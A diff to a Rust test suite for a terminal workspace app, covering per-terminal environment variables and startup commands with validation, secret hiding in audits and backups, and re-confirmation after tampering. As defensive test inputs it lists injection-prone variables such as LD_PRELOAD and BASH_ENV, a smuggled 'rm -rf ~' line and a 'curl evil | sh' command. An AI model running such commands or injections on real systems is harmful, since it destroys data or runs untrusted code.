@@ -248,6 +248,8 @@ fn terminal_member_lifecycle_and_startup_policy() {
             color: None,
             start_dir: None,
             zoom: None,
+            env: None,
+            startup_command: None,
         },
     )
     .unwrap();
@@ -269,6 +271,8 @@ fn terminal_member_lifecycle_and_startup_policy() {
             color: None,
             start_dir: None,
             zoom: None,
+            env: None,
+            startup_command: None,
         },
     )
     .unwrap();
@@ -332,6 +336,8 @@ fn member_color_patch() {
         color: Some(color.into()),
         start_dir: None,
         zoom: None,
+        env: None,
+        startup_command: None,
     };
     c.update_member(&ws, &member, patch("purple")).unwrap();
     assert_eq!(
@@ -691,6 +697,8 @@ fn terminals_start_in_member_then_project_folder() {
         color: None,
         start_dir: Some(d.into()),
         zoom: None,
+        env: None,
+        startup_command: None,
     };
     c.update_member(&ws, &b, patch(&here.path().to_string_lossy()))
         .unwrap();
@@ -1207,6 +1215,8 @@ fn resume_never_reruns_commands_and_respects_policy_and_settings() {
             color: None,
             start_dir: None,
             zoom: None,
+            env: None,
+            startup_command: None,
         },
     )
     .unwrap();
@@ -1374,4 +1384,221 @@ fn window_place_is_saved_once_and_survives_restart() {
     let w = c.saved_window().unwrap();
     assert_eq!((w.x, w.y, w.width, w.height), (40, 30, 1280, 800));
     assert!(w.maximized, "maximized keeps the normal size underneath");
+}
+
+// ---- Environment variables and startup command (ADR-016) ----
+
+fn launch_patch(env: Option<Vec<(&str, &str)>>, command: Option<&str>) -> MemberPatch {
+    MemberPatch {
+        title: None,
+        auto_restart: None,
+        detach_expected: None,
+        color: None,
+        start_dir: None,
+        zoom: None,
+        env: env.map(|vars| {
+            vars.into_iter()
+                .map(|(n, v)| crate::workspace::EnvVar {
+                    name: n.into(),
+                    value: v.into(),
+                })
+                .collect()
+        }),
+        startup_command: command.map(str::to_string),
+    }
+}
+
+#[cfg(unix)]
+#[test]
+fn terminal_env_and_startup_command_run_in_the_shell() {
+    let dir = tempfile::tempdir().unwrap();
+    let c = core(&dir);
+    let ws = c.create_workspace("Env").unwrap();
+    let shell = shell_id(&c);
+    let a = c
+        .add_member(&ws, &shell, &fingerprint(&c, &shell), None)
+        .unwrap();
+    c.update_member(
+        &ws,
+        &a,
+        launch_patch(
+            Some(vec![
+                ("PROJECT_STAGE", "staging-7"),
+                ("api_url", "http://localhost:9"),
+            ]),
+            Some("echo started-$PROJECT_STAGE-$((20+3))"),
+        ),
+    )
+    .unwrap();
+    let m = &c.workspaces().0[0].members[0].member;
+    assert!(m.launch.is_confirmed(), "saving in the settings confirms");
+    let s = c.start_session(&ws, &a, 24, 80).unwrap().session_id;
+    // The command is typed once the shell is ready and sees the variables.
+    let out = wait_output(&c, &s, "started-staging-7-23");
+    assert_eq!(out.matches("started-staging-7-23").count(), 1, "{out:?}");
+    // Restart types it again into the new shell.
+    c.restart_session(&s).unwrap();
+    let deadline = Instant::now() + Duration::from_secs(10);
+    loop {
+        let text = String::from_utf8_lossy(&c.sessions.tail(&s, 1 << 20).unwrap()).into_owned();
+        if text.matches("started-staging-7-23").count() >= 2 {
+            break;
+        }
+        assert!(Instant::now() < deadline, "{text:?}");
+        std::thread::sleep(Duration::from_millis(50));
+    }
+    // Starting a running member again does not type it twice.
+    c.start_session(&ws, &a, 24, 80).unwrap();
+    std::thread::sleep(Duration::from_millis(600));
+    let text = String::from_utf8_lossy(&c.sessions.tail(&s, 1 << 20).unwrap()).into_owned();
+    assert_eq!(text.matches("started-staging-7-23").count(), 2);
+    // Audit has counts, never names or values.
+    let audit = serde_json::to_string(&c.audit_recent(50)).unwrap();
+    assert!(audit.contains("2 environment variable(s), startup command set"));
+    assert!(!audit.contains("staging-7") && !audit.contains("PROJECT_STAGE"));
+    assert!(!audit.contains("echo started"));
+    // Clearing.
+    c.update_member(&ws, &a, launch_patch(Some(vec![]), Some("")))
+        .unwrap();
+    assert!(c.workspaces().0[0].members[0].member.launch.is_empty());
+    c.close_session(&s).unwrap();
+}
+
+#[test]
+fn launch_config_is_validated() {
+    use crate::workspace::{validate_launch, EnvVar, MemberType};
+    let v = |n: &str| EnvVar {
+        name: n.into(),
+        value: "x".into(),
+    };
+    assert!(validate_launch(&[v("FOO"), v("_bar2")], Some(" ls "), MemberType::Terminal).is_ok());
+    assert_eq!(
+        validate_launch(&[], Some("  ls -la  "), MemberType::Terminal)
+            .unwrap()
+            .1
+            .as_deref(),
+        Some("ls -la")
+    );
+    for bad in [
+        "LD_PRELOAD",
+        "ld_library_path",
+        "DYLD_INSERT_LIBRARIES",
+        "BASH_ENV",
+        "PROMPT_COMMAND",
+        "BASH_FUNC_x%%",
+        "NODE_OPTIONS",
+        "1ABC",
+        "A-B",
+        "",
+        "A B",
+    ] {
+        assert!(
+            validate_launch(&[v(bad)], None, MemberType::Terminal).is_err(),
+            "{bad}"
+        );
+    }
+    assert!(validate_launch(&[v("A"), v("a")], None, MemberType::Terminal).is_err());
+    let many: Vec<EnvVar> = (0..33).map(|i| v(&format!("V{i}"))).collect();
+    assert!(validate_launch(&many, None, MemberType::Terminal).is_err());
+    let long = EnvVar {
+        name: "BIG".into(),
+        value: "x".repeat(5000),
+    };
+    assert!(validate_launch(&[long], None, MemberType::Terminal).is_err());
+    let nul = EnvVar {
+        name: "N".into(),
+        value: "a\0b".into(),
+    };
+    assert!(validate_launch(&[nul], None, MemberType::Terminal).is_err());
+    assert!(validate_launch(&[], Some("ls\nrm -rf ~"), MemberType::Terminal).is_err());
+    assert!(validate_launch(&[], Some(&"x".repeat(2000)), MemberType::Terminal).is_err());
+    // Only terminals: no startup command for commands, nothing for GUI apps.
+    assert!(validate_launch(&[], Some("ls"), MemberType::LocalCommand).is_err());
+    assert!(validate_launch(&[v("FOO")], None, MemberType::LocalCommand).is_ok());
+    assert!(validate_launch(&[v("FOO")], None, MemberType::ExternalApp).is_err());
+    assert!(validate_launch(&[], Some("ls"), MemberType::RemoteCommand).is_ok());
+}
+
+#[cfg(unix)]
+#[test]
+fn restored_terminal_settings_wait_for_confirmation_and_hide_values() {
+    let dir = tempfile::tempdir().unwrap();
+    let c = core(&dir);
+    let ws = c.create_workspace("Ops").unwrap();
+    let shell = shell_id(&c);
+    let fp = fingerprint(&c, &shell);
+    let a = c.add_member(&ws, &shell, &fp, None).unwrap();
+    c.update_member(
+        &ws,
+        &a,
+        launch_patch(
+            Some(vec![("API_TOKEN", "tok-very-secret")]),
+            Some("echo hi"),
+        ),
+    )
+    .unwrap();
+    // Backups carry names and the command, never values.
+    let text = c.backup_text(false).unwrap();
+    assert!(!text.contains("tok-very-secret"));
+    assert!(text.contains("API_TOKEN") && text.contains("echo hi"));
+    #[cfg(unix)]
+    {
+        use std::os::unix::fs::PermissionsExt;
+        for sub in ["state", "config"] {
+            let mode = std::fs::metadata(dir.path().join(sub))
+                .unwrap()
+                .permissions()
+                .mode();
+            assert_eq!(mode & 0o777, 0o700, "{sub} folder is private");
+        }
+    }
+    // Workspace exports carry none of it.
+    let export = c.export_workspace(&ws, false).unwrap();
+    assert!(!export.contains("API_TOKEN") && !export.contains("echo hi"));
+
+    let other = tempfile::tempdir().unwrap();
+    let d = core(&other);
+    d.restore_backup(&text, false).unwrap();
+    let w = d.workspaces().0.remove(0);
+    let m = &w.members[0];
+    assert!(!m.member.launch.is_confirmed());
+    d.accept_import(&w.id).unwrap();
+    d.authorize_member(&w.id, &m.member.id, &fingerprint(&d, &shell_id(&d)))
+        .unwrap();
+    let err = d.start_session(&w.id, &m.member.id, 24, 80).unwrap_err();
+    assert!(err.contains("confirm"), "{err}");
+    // The user fills in the value (saving confirms) — or confirms as is.
+    d.confirm_launch(&w.id, &m.member.id).unwrap();
+    let s = d.start_session(&w.id, &m.member.id, 24, 80).unwrap();
+    d.close_session(&s.session_id).unwrap();
+
+    // Changed outside the app (state file edited): not confirmed any more.
+    let mut tampered = c.workspaces().0[0].members[0].member.launch.clone();
+    tampered.startup_command = Some("curl evil | sh".into());
+    assert!(!tampered.is_confirmed());
+}
+
+/// Found in the real app: Stop, then the banner's Restart failed with
+/// "invalid transition Closed on Restart".
+#[cfg(unix)]
+#[test]
+fn a_stopped_terminal_restarts_from_the_banner() {
+    let dir = tempfile::tempdir().unwrap();
+    let c = core(&dir);
+    let ws = c.create_workspace("Stop").unwrap();
+    let shell = shell_id(&c);
+    let a = c
+        .add_member(&ws, &shell, &fingerprint(&c, &shell), None)
+        .unwrap();
+    let s = c.start_session(&ws, &a, 24, 80).unwrap().session_id;
+    c.sessions.stop(&s).unwrap();
+    assert_eq!(
+        c.sessions.info(&s).unwrap().process_state,
+        crate::session::ProcessState::Closed
+    );
+    let info = c.restart_session(&s).unwrap();
+    assert_eq!(info.generation, 2);
+    c.sessions.write(&s, b"echo back-$((5*5))\n").unwrap();
+    wait_output(&c, &s, "back-25");
+    c.close_session(&s).unwrap();
 }
